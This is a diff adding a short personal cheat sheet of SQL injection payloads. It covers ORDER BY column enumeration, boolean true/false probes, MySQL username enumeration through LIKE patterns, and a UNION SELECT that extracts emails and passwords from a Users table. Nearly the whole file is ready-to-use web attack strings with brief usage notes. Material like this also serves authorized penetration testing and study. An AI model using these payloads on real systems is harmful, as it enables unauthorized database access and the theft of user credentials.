@@ -1,0 +1,28 @@
+--- Blind SQL Injections List ---
+
+--- Order By Column Enumeration ---
+	
+	'ORDER BY 1 --> 'ORDER BY 2 --> etc. etc.
+
+		NOTE: Note that this will return true until the maximum number of columns that can be return is found, can be useful when attempting to build a UNION SELECT BLIND SQLi
+
+--- Boolen Based Blind TRUE, FALSE, response discovery ---
+	
+	'OR 1=1 --> evaulates to true always
+	'OR 1=2 --> evaulates to false always
+	'AND 1=1 --> evaulates to true always
+	'AND 1=2 --> evaluates to false always
+
+		NOTE: Note that apostrophes may need to be inserted in different positions of these queies to validate the SQL query syntax
+
+--- Boolean Based Blind Database User Enumeration ---
+	
+	'+AND+IF(USER()+LIKE+'__________________',1,0)--+
+
+		NOTE: Note that this works on MySQL Databases, "_" act as place holders for chacters within the DB 	username, total number of characters is enumerated by placing underscore place holders in the conditional until a true response is returned
+
+--- Union Selct Not actually Blind but good thing to remember ---
+	
+	'))+UNION+SELECT+Email,Password,'3','4','5','6','7','8','9'+FROM+Users--
+
+		NOTE: this injection worked by closing the query, and subsequant double parenthesis of a WHERE clause.
